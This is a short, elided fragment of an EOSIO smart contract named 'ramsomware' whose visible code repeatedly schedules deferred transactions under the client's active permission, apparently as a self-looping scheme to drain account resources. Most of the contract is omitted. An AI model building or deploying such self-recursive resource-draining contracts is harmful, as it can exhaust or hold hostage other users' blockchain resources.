...
class [[eosio::contract]] ramsomware: public contract{
    ...
    public:
        ...
        //transaction out2{};
        //transaction out3{};
        out1.actions.emplace_back(permission_level{client, "active"_n}, client , "main"_n, std::make_tuple(client, uint64_t(idx+1), uint64_t(randNum)));
	// out1.send();
	    out1.send(idx+1, "client"_n, false);
        print("[#] loop  : %d \n ", idx);
